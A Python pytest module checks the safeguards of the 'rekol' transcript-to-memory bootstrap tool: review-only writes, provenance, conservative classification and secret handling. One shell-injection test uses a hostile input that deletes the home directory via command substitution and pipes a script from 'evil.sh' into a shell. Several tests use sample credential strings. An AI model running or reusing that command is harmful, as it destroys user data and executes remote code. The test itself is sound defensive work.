"""T7 (#45): bootstrap safeguards — the non-negotiable quality bar made executable.

T2 (#40) recalls candidates from the corpus and T3 (#41) batches/classifies them
review-gated; their own test modules cover the happy-path mechanics. This module
pins the EPIC #46 *safeguards* themselves as regression guards, so a later change
that loosens them fails loudly:

  - **Conservative thresholds** — a low-confidence / unclassifiable candidate
    must default to the non-ambient ``knowledge`` layer, never auto-land in
    always-on ``always``; the dedupe bars stay conservative (high).
  - **Review-gate** — nothing is auto-written: the recall (``propose
    --from-corpus``) and bootstrap-plan paths write ONLY into ``pending-review/``,
    never into a memory layer dir, and emit an explicit human-review banner.
  - **Provenance** — EVERY candidate (and every rendered line) carries a source
    ref (session id + transcript file + line), structurally, not just in a sample.
  - **Extraction-output safety** — secret-bearing / over-long junk is never
    *suggested* as always-on; dedupe holds; the rerank's length penalty saturates
    (never zeroes a candidate out → nothing silently dropped); resume preserves
    progress counters.

These are deliberately the SAFETY assertions T2/T3 don't already make, not
re-tests of their mechanics. Hermetic throughout: deterministic ``HashingEmbedder``,
throwaway tmp stores, the conftest autouse env isolation. No LLM, no network.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from click.testing import CliRunner

from rekol.bootstrap import (
    BootstrapBatch,
    classify_layer,
    plan_batches,
    refined_score,
    render_batch_review,
    rerank_candidates,
    suggested_frontmatter,
    write_batch_candidates,
)
from rekol.bootstrap_state import load_state, save_state, state_path_for
from rekol.cli_capture import LAYERS
from rekol.corpus_propose import (
    MEMORY_DUPLICATE_THRESHOLD,
    CorpusCandidate,
    recall_corpus_candidates,
    render_corpus_proposal,
)
from rekol.embeddings import HashingEmbedder
from rekol.model import ALLOWED_TYPES
from rekol.sessions.store import SessionStore

# The on-disk memory-layer directories nothing in the recall/bootstrap path may
# write to. ``topics`` is the plural dir for the singular ``topic`` layer.
_MEMORY_LAYER_DIRS = ("always", "when", "topics", "knowledge", "projects")


def _cand(
    content: str,
    *,
    role: str = "user",
    cwd: str | None = "/home/leon/github/rekol",
    session_id: str = "sess-1",
    uuid: str = "uuid-1",
    score: float = 0.5,
    ts: str = "2026-01-01T10:00:00Z",
    line: int = 1,
    matched_query: str = "we always do this",
) -> CorpusCandidate:
    """Build a CorpusCandidate with full provenance (mirrors the T3 test helper)."""
    return CorpusCandidate(
        content=content,
        session_id=session_id,
        message_uuid=uuid,
        role=role,
        cwd=cwd,
        timestamp_iso=ts,
        jsonl_path=f"/transcripts/{session_id}.jsonl",
        line_number=line,
        score=score,
        matched_query=matched_query,
    )


# ===================== Conservative thresholds =====================


def test_classify_unclassifiable_never_lands_in_ambient_always() -> None:
    """A candidate matching no layer signal defaults to knowledge, never always.

    The core conservatism guard: a misclassification must fall to the non-ambient
    ``knowledge`` layer, never silently into always-on ``always`` context.
    """
    for junk in (
        "The Dell box has 64GB of RAM",
        "sk-proj-abc123def456ghi789jkl012mno345",
        "lorem ipsum dolor sit amet",
        "",
        "   ",
        "1234567890",
    ):
        assert classify_layer(junk) == "knowledge", f"{junk!r} must default to knowledge"


def test_classify_layer_only_ever_returns_a_known_layer() -> None:
    """classify_layer never emits a layer outside the capture vocabulary.

    A guess outside ``{always, when, topic, knowledge}`` would break ``rekol
    capture --layer`` and could route a candidate somewhere unintended.
    """
    samples = [
        "always run ruff",
        "when deploying pull first",
        "the repo lives in ~/x",
        "some unrelated durable fact",
        "NEVER force-push main",
    ]
    valid = {"always", "when", "topic", "knowledge"}
    for s in samples:
        assert classify_layer(s) in valid
    # The capture CLI and the model must agree on that vocabulary.
    assert valid == set(LAYERS) == ALLOWED_TYPES


def test_suggested_frontmatter_defaults_to_knowledge_not_always() -> None:
    """An unclassifiable candidate's seed frontmatter type is the safe non-ambient default."""
    fm = suggested_frontmatter("The Dell box has 64GB of RAM")
    assert fm["type"] == "knowledge", "seed frontmatter must not default to ambient always"


def test_dedupe_thresholds_are_conservative() -> None:
    """The dedupe bars stay high so near-misses surface for review, not silent-drop.

    A low threshold would let a loosely-related memory suppress a genuinely-new
    candidate (recall loss); the bar must err toward surfacing. Both propose
    modes share one constant so they cannot drift apart.
    """
    from rekol.cli_propose import DUPLICATE_THRESHOLD

    assert MEMORY_DUPLICATE_THRESHOLD >= 0.75
    assert DUPLICATE_THRESHOLD == MEMORY_DUPLICATE_THRESHOLD


# ===================== Review-gate: no silent writes =====================


def _seed_memory_home(root: Path) -> None:
    (root / "topics").mkdir(parents=True, exist_ok=True)
    (root / "rekol.config.yaml").write_text("embedding_model: test-hashing\n")


def _seed_sessions(db_path: Path, embedder: HashingEmbedder) -> None:
    store = SessionStore(db_path=db_path, dim=embedder.dim)
    store.init_schema()
    messages = [
        dict(
            session_id="sess-rekol",
            message_uuid="u1",
            parent_uuid=None,
            role="user",
            content="We always deploy via docker compose pull, never manually.",
            cwd="/home/leon/github/rekol",
            timestamp_iso="2026-06-01T10:00:00Z",
            timestamp_unix=1780308000,
            jsonl_path="/transcripts/sess-rekol.jsonl",
            line_number=12,
        ),
    ]
    for msg in messages:
        rowid = store.insert_message(msg)
        assert rowid is not None
        store.upsert_embedding(rowid, embedder.embed(msg["content"]))
    store.close()


def _memory_layer_files(memory_home: Path) -> list[Path]:
    """Every file written under a real memory-layer dir (the things capture writes)."""
    found: list[Path] = []
    for layer_dir in _MEMORY_LAYER_DIRS:
        base = memory_home / layer_dir
        if base.exists():
            found.extend(p for p in base.rglob("*") if p.is_file())
    return found


def test_bootstrap_plan_writes_only_pending_review_no_memory_layer(
    tmp_path: Path, monkeypatch
) -> None:
    """Planning a run writes review files + a checkpoint ONLY — never a memory file.

    The hard AC ("no silent writes"): the engine recalls/scopes/batches and
    checkpoints, but the ONLY thing that writes curated memory is ``rekol capture``
    on an approved item. After a plan, no ``always/`` / ``when/`` / ``topics/`` /
    ``knowledge/`` file may exist.
    """
    from rekol.cli_bootstrap import main as bootstrap_main
    from rekol.config import load_config

    memory_home = tmp_path / "home"
    _seed_memory_home(memory_home)
    monkeypatch.setenv("REKOL_HOME", str(memory_home))
    cfg = load_config()
    _seed_sessions(cfg.sessions_db_path, HashingEmbedder(dim=384))

    before = {p.read_bytes() for p in _memory_layer_files(memory_home)}
    result = CliRunner().invoke(bootstrap_main, ["--all-time"])
    assert result.exit_code == 0, result.output

    # Review artifacts landed under pending-review/ ...
    pending = memory_home / "pending-review"
    assert sorted(pending.glob("bootstrap-*.md")), "expected per-batch review files"
    assert (pending / ".bootstrap-state.json").exists()
    # ... and NOTHING new landed in any memory layer dir.
    after = {p.read_bytes() for p in _memory_layer_files(memory_home)}
    assert after == before, "bootstrap plan must not write any curated-memory file"


def test_propose_from_corpus_writes_only_pending_review_no_memory_layer(
    tmp_path: Path, monkeypatch
) -> None:
    """`propose --from-corpus` writes a review checklist only — never a memory file."""
    from rekol.cli_propose import main as propose_main
    from rekol.config import load_config

    memory_home = tmp_path / "home"
    _seed_memory_home(memory_home)
    monkeypatch.setenv("REKOL_HOME", str(memory_home))
    cfg = load_config()
    _seed_sessions(cfg.sessions_db_path, HashingEmbedder(dim=384))

    before = {p.read_bytes() for p in _memory_layer_files(memory_home)}
    result = CliRunner().invoke(propose_main, ["--from-corpus"])
    assert result.exit_code == 0, result.output

    assert sorted((memory_home / "pending-review").glob("*.md")), "expected a review file"
    after = {p.read_bytes() for p in _memory_layer_files(memory_home)}
    assert after == before, "propose must not write any curated-memory file"


def test_bootstrap_review_file_states_review_gate_explicitly(tmp_path: Path) -> None:
    """Each batch review file must SAY nothing is auto-captured (operator honesty)."""
    pending = tmp_path / "pending-review"
    batch = BootstrapBatch(
        batch_id="project-rekol", candidates=[_cand("always squash", role="user", uuid="u")]
    )
    body = write_batch_candidates(batch, pending_dir=pending, run_id="r1").read_text()
    lowered = body.lower()
    assert "review" in lowered
    assert "auto-captured" in lowered or "nothing here is auto" in lowered


def test_render_corpus_proposal_states_no_autowrite() -> None:
    """The corpus proposal banner must be explicit that nothing is auto-written."""
    body = render_corpus_proposal(
        new_candidates=[_cand("we always squash-merge", uuid="u")],
        already_captured=[],
        timestamp="20260101-000000",
    )
    lowered = body.lower()
    assert "no auto-write" in lowered or "no llm, no auto-write" in lowered


# ===================== Provenance: every candidate is traceable =====================


def test_every_recalled_candidate_carries_full_provenance(tmp_path: Path) -> None:
    """Recall attaches session id + transcript file + line to EVERY candidate.

    Structural (not sampled): an untraceable candidate can't be verified against
    its source, which would undermine the conservative review gate.
    """
    embedder = HashingEmbedder(dim=384)
    store = SessionStore(db_path=tmp_path / "sessions.db", dim=embedder.dim)
    store.init_schema()
    for i, content in enumerate(
        [
            "We always deploy via docker compose pull on the Dell box.",
            "I prefer verbose descriptive variable names.",
            "The rekol repo lives in ~/github/rekol.",
        ]
    ):
        msg = dict(
            session_id=f"sess-{i}",
            message_uuid=f"uuid-{i}",
            parent_uuid=None,
            role="user",
            content=content,
            cwd="/home/leon/github/rekol",
            timestamp_iso="2026-01-01T10:00:00Z",
            timestamp_unix=1767261600,
            jsonl_path=f"/transcripts/sess-{i}.jsonl",
            line_number=i + 1,
        )
        rowid = store.insert_message(msg)
        assert rowid is not None
        store.upsert_embedding(rowid, embedder.embed(content))
    try:
        candidates = recall_corpus_candidates(store, embedder, per_query_top_k=5)
    finally:
        store.close()

    assert candidates, "expected recalled candidates to assert provenance over"
    for cand in candidates:
        assert cand.session_id, "missing session id"
        assert cand.jsonl_path.endswith(".jsonl"), "missing/odd transcript path"
        assert cand.line_number >= 1, "missing transcript line number"
        assert cand.timestamp_iso, "missing timestamp"


def test_recall_honors_exclude_paths_dropping_excluded_cwd(tmp_path: Path) -> None:
    """A candidate whose cwd matches an exclude pattern must NOT appear in recall.

    The privacy chokepoint: a user's ``exclude_paths``/``.rekolignore`` is honored
    on the recall path too (reachable with ``archive_enabled=false`` +
    ``session_search_enabled=true``), so a sensitive project they excluded from
    archiving/indexing is also excluded from corpus recall — not just dropped by
    dedupe afterward, which would still embed its content.
    """
    embedder = HashingEmbedder(dim=384)
    store = SessionStore(db_path=tmp_path / "sessions.db", dim=embedder.dim)
    store.init_schema()
    rows = [
        # Kept: an ordinary project cwd.
        ("/home/leon/github/rekol", "sess-keep", "u-keep"),
        # Excluded: a cwd under the secret project the pattern names.
        ("/home/leon/github/secret-project", "sess-secret", "u-secret"),
    ]
    for cwd, session_id, uuid in rows:
        msg = dict(
            session_id=session_id,
            message_uuid=uuid,
            parent_uuid=None,
            role="user",
            content="We always deploy via docker compose pull on the Dell box.",
            cwd=cwd,
            timestamp_iso="2026-01-01T10:00:00Z",
            timestamp_unix=1767261600,
            jsonl_path=f"/transcripts/{session_id}.jsonl",
            line_number=1,
        )
        rowid = store.insert_message(msg)
        assert rowid is not None
        store.upsert_embedding(rowid, embedder.embed(msg["content"]))
    try:
        candidates = recall_corpus_candidates(
            store, embedder, per_query_top_k=5, exclude_patterns=["secret-project"]
        )
    finally:
        store.close()

    recalled_cwds = {c.cwd for c in candidates}
    assert "/home/leon/github/secret-project" not in recalled_cwds, (
        "an excluded-cwd candidate leaked into recall output"
    )
    # And the non-excluded project still surfaces (the filter narrows, not nukes).
    assert "/home/leon/github/rekol" in recalled_cwds


def test_every_rendered_batch_line_carries_a_source_ref(tmp_path: Path) -> None:
    """Each candidate in a rendered batch review prints its source ref line.

    One ``source:`` annotation per checklist item, so an operator can open the
    exact transcript turn for every candidate before approving it.
    """
    candidates = [
        _cand("always run ruff", uuid="a", session_id="s-a", line=11),
        _cand("when deploying pull images", uuid="b", session_id="s-b", line=22),
        _cand("the repo lives in ~/x", uuid="c", session_id="s-c", line=33),
    ]
    batch = BootstrapBatch(batch_id="project-x", candidates=rerank_candidates(candidates))
    body = render_batch_review(batch, run_id="r1")

    # One source line per candidate, and each candidate's session + line appears.
    assert body.count("source: session") == len(candidates)
    for cand in candidates:
        assert cand.session_id in body
        assert cand.jsonl_path in body
        assert str(cand.line_number) in body


def test_corpus_proposal_has_a_source_ref_per_new_candidate() -> None:
    """The T2 corpus proposal annotates every NEW candidate with its source."""
    candidates = [
        _cand("we always squash", uuid="a", session_id="s-a", line=5),
        _cand("never rebase shared branches", uuid="b", session_id="s-b", line=9),
    ]
    body = render_corpus_proposal(
        new_candidates=candidates, already_captured=[], timestamp="20260101-000000"
    )
    assert body.count("source: session") == len(candidates)
    for cand in candidates:
        assert cand.session_id in body
        assert str(cand.line_number) in body


# ===================== Extraction-output safety =====================


def test_secret_bearing_candidate_is_not_suggested_as_ambient_always() -> None:
    """A secret-looking candidate is never auto-suggested into always-on memory.

    Recall is deliberately broad, so a secret-bearing line CAN surface — but it
    must not be classified ambient. It falls to non-ambient ``knowledge`` (its
    text has no standing-instruction signal), and capture stays a human decision.
    """
    secrets = [
        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "the password is hunter2",
        "token: ghp_1234567890abcdefghijklmnopqrstuvwxyz",
        "-----BEGIN RSA PRIVATE KEY-----",
    ]
    for secret in secrets:
        assert classify_layer(secret) != "always", f"{secret!r} must not be ambient"
        assert suggested_frontmatter(secret)["type"] != "always"


def test_secret_bearing_candidate_leading_with_instruction_keyword_is_knowledge() -> None:
    """A secret-bearing line that STARTS with an instruction keyword is still knowledge.

    The original secret guard used only neutral-leading inputs, so a line like
    ``"use api_key=sk-..."`` would have matched ``_ALWAYS_RE`` and been nominated
    for always-on memory — leaking a secret into ambient context. The secret
    pre-check must win over the leading keyword: such lines fall to non-ambient
    ``knowledge`` REGARDLESS of the leading instruction word.
    """
    secret_with_instruction_lead = [
        "use AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "always set TOKEN=ghp_1234567890abcdef in CI",
        "never share my password hunter2",
        "prefer api_key=sk-abc123 over the default",
        "use AKIAIOSFODNN7EXAMPLE for the staging bucket",
        "always paste -----BEGIN RSA PRIVATE KEY----- into the env file",
    ]
    for line in secret_with_instruction_lead:
        assert classify_layer(line) == "knowledge", (
            f"{line!r} leads with an instruction keyword but bears a secret — "
            "it must classify knowledge, never always"
        )
        assert suggested_frontmatter(line)["type"] == "knowledge"


def test_multiline_candidate_renders_as_a_single_checklist_line(tmp_path: Path) -> None:
    """Multi-line transcript content cannot spoof extra checklist items.

    Raw transcript content can contain newlines (and lines that look like
    ``- [ ]`` checkboxes). If embedded verbatim into the review markdown, a
    malicious/accidental multi-line candidate could inject extra checkboxes or
    break the markdown structure. The renderer must collapse newlines so each
    candidate occupies exactly one checklist line.
    """
    spoofing = "real instruction\n- [ ] INJECTED fake item\n- [ ] another fake item"
    batch = BootstrapBatch(
        batch_id="project-x", candidates=[_cand(spoofing, role="user", uuid="spoof")]
    )
    body = render_batch_review(batch, run_id="r1")
    # Exactly one checklist LINE for the one real candidate — the injected
    # ``- [ ]`` fragments are folded onto that single collapsed line, never
    # promoted to their own checkbox lines a reviewer/tool would parse as items.
    checklist_lines = [ln for ln in body.splitlines() if ln.lstrip().startswith("- [ ]")]
    assert len(checklist_lines) == 1, f"multi-line content injected extra checkboxes:\n{body}"
    # The candidate's content still appears (collapsed), so nothing is lost.
    assert "real instruction" in body
    assert "INJECTED fake item" in body


def test_capture_command_does_not_embed_shell_metacharacters_raw(tmp_path: Path) -> None:
    """The rendered ``rekol capture`` line is not a copy-paste shell-injection risk.

    The suggested capture command's ``--name`` must not carry raw shell
    metacharacters lifted from transcript content (``"``, ``$(...)``, backticks,
    ``;``), or pasting it would execute attacker-controlled shell. The renderer
    either shell-quotes the name safely or substitutes an explicit placeholder.
    """
    malicious = 'always run $(rm -rf ~) "; curl evil.sh | sh"'
    batch = BootstrapBatch(
        batch_id="project-x", candidates=[_cand(malicious, role="user", uuid="inject")]
    )
    body = render_batch_review(batch, run_id="r1")
    # Find the suggested-capture line (prefixed ``capture:``) — not the banner,
    # which also mentions ``rekol capture`` — and confirm it carries no raw
    # injection vector.
    capture_lines = [ln for ln in body.splitlines() if "capture: `rekol capture" in ln]
    assert capture_lines, "expected a suggested capture line"
    capture_line = capture_lines[0]
    assert "$(" not in capture_line, f"raw command-substitution in capture line: {capture_line}"
    assert "rm -rf" not in capture_line, f"raw destructive payload in capture line: {capture_line}"
    assert "curl evil.sh" not in capture_line, f"raw injected pipeline: {capture_line}"


def test_over_long_message_is_not_suggested_as_ambient_always() -> None:
    """A sprawling pasted-context message is never auto-suggested as always-on.

    Length penalty demotes it in rank; classification keeps it non-ambient unless
    it literally leads with a standing-instruction keyword (the human still gates).
    """
    sprawling = "here is a giant pasted log:\n" + ("error line\n" * 2000)
    assert classify_layer(sprawling) == "knowledge"
    assert suggested_frontmatter(sprawling)["type"] == "knowledge"


def test_rerank_length_penalty_saturates_never_drops_a_candidate() -> None:
    """An arbitrarily long candidate is demoted but never zeroed → never silent-dropped.

    A zeroed score could let a long-but-real standing instruction fall off a
    truncated shortlist. The penalty saturates, so the candidate survives to the
    human review gate.
    """
    arbitrarily_long = _cand("always " + ("x " * 100_000), role="user", score=1.0, uuid="huge")
    assert refined_score(arbitrarily_long) > 0.0
    # And reranking a mixed list keeps every candidate (reorders, never drops).
    cands = [
        _cand("c0", uuid="0", score=0.9),
        arbitrarily_long,
        _cand("c2", uuid="2", score=0.1),
    ]
    ranked = rerank_candidates(cands)
    assert {c.message_uuid for c in ranked} == {"0", "huge", "2"}


def test_rerank_is_deterministic_across_repeated_runs() -> None:
    """Reranking is stable, so a resume reranks identically (no order churn).

    Ties break on a fixed key (recall score, session, uuid), so the same input
    always yields the same order — a resumed batch presents the same review order.
    """
    cands = [
        _cand("dup", uuid="z", session_id="s2", score=0.5),
        _cand("dup", uuid="a", session_id="s1", score=0.5),
        _cand("dup", uuid="m", session_id="s1", score=0.5),
    ]
    first = [c.message_uuid for c in rerank_candidates(cands)]
    second = [c.message_uuid for c in rerank_candidates(list(reversed(cands)))]
    assert first == second, "rerank order must be deterministic regardless of input order"


def test_plan_batches_preserves_every_candidate_no_silent_drop() -> None:
    """Batching reorders/groups but never drops a recalled candidate.

    Every recalled candidate must reach a review file — a dropped one is a silent
    recall loss the operator never sees.
    """
    cands = [
        _cand("a", cwd="/x/rekol", uuid="a"),
        _cand("b", cwd="/x/infra", uuid="b"),
        _cand("c", cwd=None, uuid="c"),
        _cand("d", cwd="/x/rekol", uuid="d"),
    ]
    batched = {c.message_uuid for batch in plan_batches(cands) for c in batch.candidates}
    assert batched == {"a", "b", "c", "d"}


def test_render_batch_review_is_a_checklist_not_a_capture(tmp_path: Path) -> None:
    """Review items are unchecked ``- [ ]`` boxes + a *suggested* capture line.

    The capture invocation is shown for the operator/assistant to run after
    approval — it is text, never executed by the engine.
    """
    batch = BootstrapBatch(batch_id="project-x", candidates=[_cand("always run ruff", uuid="u")])
    body = render_batch_review(batch, run_id="r1")
    assert "- [ ]" in body, "candidates must be unchecked review boxes"
    # The capture line is a suggestion (prefixed 'capture:'), not an executed action.
    assert "capture: `rekol capture" in body


# ===================== Notes-path extraction dedupe (T2 regex mode) =====================


def test_extract_candidates_dedupes_case_insensitively() -> None:
    """The notes-path extractor collapses case-variant duplicates to one candidate."""
    from rekol.cli_propose import extract_candidates

    text = "\n".join(
        [
            "TODO: use ruff for linting",
            "todo: Use Ruff For Linting",  # same statement, different case
            "Decision: chose postgres",
        ]
    )
    out = extract_candidates(text)
    lowered = [c.lower() for c in out]
    assert len(lowered) == len(set(lowered)), f"duplicate candidates leaked: {out}"


# ===================== Checkpoint / resume safety (gap-fill over T3) =====================


def test_resume_preserves_candidates_written_counter(tmp_path: Path) -> None:
    """A save/load roundtrip preserves the candidates-written count (no reset on resume).

    T3 roundtrips the whole state; this pins the specific field a resume reports,
    so a regression that drops it (and silently reports 0 written) is caught.
    """
    from rekol.bootstrap_state import BootstrapState

    state = BootstrapState(
        run_id="20260607-120000",
        embedding_model="test-hashing",
        scope={"projects": [], "days": 90, "max_sessions": 200},
        batches=["project-rekol", "project-infra"],
        completed=["project-rekol"],
        created_iso="2026-06-07T12:00:00-04:00",
        updated_iso="2026-06-07T12:00:00-04:00",
        candidates_written=17,
    )
    path = state_path_for(tmp_path)
    save_state(state, path)
    loaded = load_state(path)
    assert loaded is not None
    assert loaded.candidates_written == 17
    assert loaded.completed == ["project-rekol"], "resume must keep the done set"


def test_save_state_overwrites_stale_tmp_leaving_only_final(tmp_path: Path) -> None:
    """A leftover ``.tmp`` from a crashed prior write doesn't corrupt the next save.

    Atomic save writes to a fixed temp name then renames; a stale temp from a
    killed prior run must be overwritten and consumed, never left behind to be
    mistaken for live state.
    """
    from rekol.bootstrap_state import STATE_FILENAME, BootstrapState

    pending = tmp_path / "pending-review"
    pending.mkdir(parents=True)
    stale_tmp = pending / (STATE_FILENAME + ".tmp")
    stale_tmp.write_text("{garbage from a crashed write")

    state = BootstrapState(
        run_id="r1",
        embedding_model="test-hashing",
        scope={"projects": [], "days": 90, "max_sessions": 200},
        batches=["project-rekol"],
    )
    path = state_path_for(tmp_path)
    save_state(state, path)

    leftovers = [p.name for p in path.parent.iterdir() if p != path]
    assert leftovers == [], f"stale temp must be consumed by the atomic save: {leftovers}"
    assert load_state(path) == state


def test_write_batch_candidates_is_atomic_no_torn_tmp_left_behind(tmp_path: Path) -> None:
    """A batch review file is written atomically: no ``.tmp`` survives a clean write.

    ``write_batch_candidates`` mirrors ``save_state``'s temp-file + ``os.replace``
    pattern so a process killed mid-write leaves the previous complete file or the
    new complete one, never a torn one. After a successful write only the final
    ``.md`` exists — no leftover ``.tmp`` sibling.
    """
    pending = tmp_path / "pending-review"
    batch = BootstrapBatch(
        batch_id="project-rekol", candidates=[_cand("always run ruff", uuid="u")]
    )
    out_path = write_batch_candidates(batch, pending_dir=pending, run_id="r1")

    assert out_path.exists()
    leftovers = [p.name for p in pending.iterdir() if p.name.endswith(".tmp")]
    assert leftovers == [], f"atomic write left a torn temp file behind: {leftovers}"
    # The published file is complete (parses as a review with the candidate).
    assert "always run ruff" in out_path.read_text(encoding="utf-8")


def test_plan_persists_checkpoint_before_writing_all_batches(tmp_path: Path, monkeypatch) -> None:
    """A crash mid-plan leaves a resumable checkpoint, not orphaned review files.

    The checkpoint used to be written only AFTER every batch's review file, so a
    crash mid-plan orphaned the files behind a missing checkpoint and forced a
    full replan. ``_plan_run`` now persists a "planning started" checkpoint before
    the write loop and re-saves it after each batch. We simulate a crash on the
    second batch's write and assert the checkpoint is already on disk (with the
    full plan), so a resume finds it.
    """
    import rekol.cli_bootstrap as cli_bootstrap
    from rekol.config import load_config

    memory_home = tmp_path / "home"
    _seed_memory_home(memory_home)
    monkeypatch.setenv("REKOL_HOME", str(memory_home))
    cfg = load_config()

    # All-time scope (days=None) so the candidates' fixed timestamps aren't dropped
    # by the default recency window — we only care about the batch-write loop here.
    scope = cli_bootstrap.ScopeFilter(projects=[], days=None, max_sessions=None)

    # Two batches across two projects so the write loop runs more than once.
    candidates = [
        _cand("always run ruff", cwd="/home/leon/github/rekol", uuid="a", session_id="s-a"),
        _cand("always pin deps", cwd="/home/leon/github/infra", uuid="b", session_id="s-b"),
    ]
    monkeypatch.setattr(cli_bootstrap, "_recall_and_dedupe", lambda _cfg: candidates)

    # Crash on the SECOND batch write to simulate a reap mid-plan.
    real_write = cli_bootstrap.write_batch_candidates
    calls = {"n": 0}

    def flaky_write(batch, *, pending_dir, run_id, top_n=None):
        calls["n"] += 1
        if calls["n"] == 2:
            raise RuntimeError("simulated reap mid-plan")
        return real_write(batch, pending_dir=pending_dir, run_id=run_id, top_n=top_n)

    monkeypatch.setattr(cli_bootstrap, "write_batch_candidates", flaky_write)

    with pytest.raises(RuntimeError, match="simulated reap"):
        cli_bootstrap._plan_run(cfg, scope)

    # The checkpoint landed BEFORE the crash, with the full two-batch plan, so a
    # resume picks it up rather than replanning from scratch over orphaned files.
    state = load_state(state_path_for(memory_home))
    assert state is not None, "no checkpoint persisted — a resume would replan from scratch"
    assert len(state.batches) == 2, "checkpoint must carry the full batch plan"
    assert state.completed == [], "planning writes files only; no batch is processed/done yet"
